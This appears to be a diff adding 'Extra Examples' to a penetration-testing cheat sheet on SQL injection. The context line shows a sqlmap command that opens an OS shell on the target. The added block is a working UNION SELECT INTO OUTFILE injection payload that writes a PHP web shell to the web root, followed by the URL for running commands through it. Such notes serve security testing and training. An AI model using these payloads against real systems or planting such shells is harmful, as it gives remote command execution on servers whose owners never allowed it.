@@ -358,3 +358,14 @@ $ sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
 ```
 
 You will be prompted for the web app's language, and then given a shell.
+
+Extra Examples:
+
+```
+// the nulls below are ignoring columns we can't exploit, and the exploit is only written to the 5th column, which is vulnerable
+
+mail-list=test'+union+select+null,null,null,null,'<?php+system($_GET["cmd"]);+?>',null+into+outfile+'/var/www/html/rce.php'#
+
+// then navigate to http://111.111.111.111/rce.php?cmd=whoami
+```
+
